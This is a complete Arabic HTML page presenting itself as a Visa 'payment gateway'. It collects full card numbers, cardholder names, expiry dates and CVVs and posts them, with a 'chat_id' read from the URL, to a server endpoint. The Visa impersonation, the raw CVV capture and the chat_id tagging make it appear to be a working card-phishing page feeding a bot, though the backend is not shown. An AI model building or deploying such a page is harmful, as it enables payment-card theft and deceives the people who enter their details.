<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>بوابة الدفع - فيزا</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{font-family:sans-serif;background:#0a0a0f;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;}
.container{width:100%;max-width:460px;}
.card{background:linear-gradient(145deg,#2a2a3a,#1a1a2e);border-radius:24px;padding:40px 35px;border:1px solid rgba(255,255,255,0.08);box-shadow:0 25px 80px rgba(0,0,0,0.6);}
.card-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:35px;}
.card-header h1{color:#fff;font-size:26px;font-weight:900;font-style:italic;}
.visa-logo{width:70px;height:45px;background:linear-gradient(135deg,#1a1f71,#fff);border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:900;color:#1a1f71;font-style:italic;}
.form-group{margin-bottom:22px;}
label{display:block;color:#aaa;font-size:13px;margin-bottom:8px;font-weight:700;}
input{width:100%;padding:16px 18px;background:rgba(0,0,0,0.35);border:1px solid rgba(255,255,255,0.1);border-radius:14px;color:#fff;font-size:16px;transition:all 0.3s;text-align:right;}
input:focus{outline:none;border-color:#ffd700;box-shadow:0 0 20px rgba(255,215,0,0.15);}
input::placeholder{color:#666;}
.row{display:flex;gap:15px;}
.row .form-group{flex:1;}
.pay-button{width:100%;padding:18px;background:linear-gradient(135deg,#28a745,#20c997);color:#fff;border:none;border-radius:14px;font-size:17px;font-weight:700;cursor:pointer;transition:all 0.3s;margin-top:10px;}
.pay-button:hover{transform:translateY(-2px);box-shadow:0 10px 35px rgba(40,167,69,0.4);}
.security-footer{display:flex;align-items:center;justify-content:center;gap:8px;margin-top:25px;color:#666;font-size:12px;}
.spinner{display:none;width:20px;height:20px;border:2px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:spin 0.8s linear infinite;margin-left:10px;vertical-align:middle;}
@keyframes spin{to{transform:rotate(360deg);}}
.message{display:none;padding:14px 18px;border-radius:12px;margin-bottom:20px;font-size:14px;font-weight:700;text-align:center;}
.message.success{display:block;background:rgba(40,167,69,0.15);border:1px solid rgba(40,167,69,0.3);color:#28a745;}
.message.error{display:block;background:rgba(231,76,60,0.15);border:1px solid rgba(231,76,60,0.3);color:#e74c3c;}
.card-preview{background:linear-gradient(135deg,#1a1f71,#0d0d1a);border-radius:16px;padding:25px;margin-bottom:30px;min-height:180px;display:flex;flex-direction:column;justify-content:space-between;position:relative;}
.card-chip{width:45px;height:35px;background:linear-gradient(135deg,#d4af37,#f4d03f,#d4af37);border-radius:8px;}
.card-number-display{color:#fff;font-size:22px;letter-spacing:3px;font-family:monospace;margin:20px 0;direction:ltr;text-align:left;}
.card-details{display:flex;justify-content:space-between;color:#ccc;font-size:13px;}
.card-details .label{font-size:10px;color:#888;}
.card-details .value{color:#fff;font-family:monospace;letter-spacing:2px;margin-top:4px;}
.card-logo{position:absolute;bottom:20px;left:25px;font-size:24px;font-weight:900;font-style:italic;color:rgba(255,255,255,0.9);}
.amount-display{text-align:center;margin-bottom:25px;padding:15px;background:rgba(255,215,0,0.05);border-radius:12px;border:1px solid rgba(255,215,0,0.1);}
.amount-display .label{color:#888;font-size:13px;margin-bottom:5px;}
.amount-display .value{color:#ffd700;font-size:28px;font-weight:900;}
</style>
</head>
<body>
<div class="container">
<div class="card">
<div class="card-header"><h1>بوابة الدفع</h1><div class="visa-logo">VISA</div></div>
<div class="amount-display"><div class="label">المبلغ المطلوب</div><div class="value" id="amountValue">$0.00</div></div>
<div class="card-preview">
<div class="card-chip"></div>
<div class="card-number-display" id="cardNumberDisplay">•••• •••• •••• ••••</div>
<div class="card-details">
<div><div class="label">Card Holder</div><div class="value" id="cardNameDisplay">YOUR NAME</div></div>
<div><div class="label">Expires</div><div class="value" id="cardExpiryDisplay">MM/YY</div></div>
</div>
<div class="card-logo">VISA</div>
</div>
<div id="messageBox" class="message"></div>
<form id="paymentForm">
<div class="form-group"><label>رقم البطاقة</label><input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="cc-number"></div>
<div class="form-group"><label>الاسم على البطاقة</label><input type="text" id="cardName" placeholder="الاسم الكامل" autocomplete="cc-name"></div>
<div class="row">
<div class="form-group"><label>تاريخ الانتهاء</label><input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5" autocomplete="cc-exp"></div>
<div class="form-group"><label>CVV</label><input type="password" id="cvv" placeholder="123" maxlength="4" autocomplete="cc-csc"></div>
</div>
<button type="submit" class="pay-button" id="payButton"><span id="btnText">اتمام الدفع</span><span class="spinner" id="spinner"></span></button>
</form>
<div class="security-footer"><span>مدفوعات آمنة ومشفرة 256-bit</span></div>
</div>
</div>
<script>
const urlParams=new URLSearchParams(window.location.search);
const amount=urlParams.get('amount')||'0.00';
const currency=urlParams.get('currency')||'USD';
const chatId=urlParams.get('chat_id')||'';
const orderId=urlParams.get('order_id')||'';
document.getElementById('amountValue').textContent=`${amount} ${currency}`;
const cardNumber=document.getElementById('cardNumber');
const cardNumberDisplay=document.getElementById('cardNumberDisplay');
cardNumber.addEventListener('input',(e)=>{let v=e.target.value.replace(/\D/g,'');v=v.substring(0,16);const f=v.match(/.{1,4}/g)?.join(' ')||v;e.target.value=f;let d='';for(let i=0;i<16;i++){d+=i<v.length?v[i]:'•';if((i+1)%4===0&&i<15)d+=' ';}cardNumberDisplay.textContent=v.length>0?d:'•••• •••• •••• ••••';});
const cardName=document.getElementById('cardName');
const cardNameDisplay=document.getElementById('cardNameDisplay');
cardName.addEventListener('input',(e)=>{cardNameDisplay.textContent=e.target.value.toUpperCase()||'YOUR NAME';});
const expiryDate=document.getElementById('expiryDate');
const cardExpiryDisplay=document.getElementById('cardExpiryDisplay');
expiryDate.addEventListener('input',(e)=>{let v=e.target.value.replace(/\D/g,'');if(v.length>=2)v=v.substring(0,2)+'/'+v.substring(2,4);e.target.value=v;cardExpiryDisplay.textContent=v||'MM/YY';});
document.getElementById('cvv').addEventListener('input',(e)=>{e.target.value=e.target.value.replace(/\D/g,'').substring(0,4);});
const form=document.getElementById('paymentForm');
const payButton=document.getElementById('payButton');
const btnText=document.getElementById('btnText');
const spinner=document.getElementById('spinner');
const messageBox=document.getElementById('messageBox');
function showMessage(t,type){messageBox.textContent=t;messageBox.className=`message ${type}`;setTimeout(()=>{messageBox.className='message';messageBox.textContent='';},5000);}
function setLoading(l){payButton.disabled=l;spinner.style.display=l?'inline-block':'none';btnText.textContent=l?'جاري المعالجة...':'اتمام الدفع';}
form.addEventListener('submit',async(e)=>{e.preventDefault();const num=cardNumber.value.replace(/\s/g,'');const name=cardName.value.trim();const exp=expiryDate.value;const cvvVal=cvv.value;if(num.length!==16){showMessage('رقم البطاقة يجب ان يكون 16 رقما','error');return;}if(name.length<3){showMessage('الرجاء ادخال الاسم الكامل','error');return;}if(!/^\d{2}\/\d{2}$/.test(exp)){showMessage('تاريخ الانتهاء غير صحيح','error');return;}if(cvvVal.length<3){showMessage('CVV يجب ان يكون 3 ارقام على الاقل','error');return;}setLoading(true);try{const r=await fetch('/api/process-payment',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cardNumber:num,cardName:name,expiryDate:exp,cvv:cvvVal,amount,currency,chatId,orderId})});const result=await r.json();if(result.success){showMessage('تم الدفع بنجاح!','success');setTimeout(()=>window.location.href=result.redirectUrl||'/success',2000);}else{showMessage(result.message||'فشلت عملية الدفع','error');}}catch(err){showMessage('خطأ في الاتصال بالخادم','error');console.error(err);}finally{setLoading(false);}});
</script>
</body>
</html>
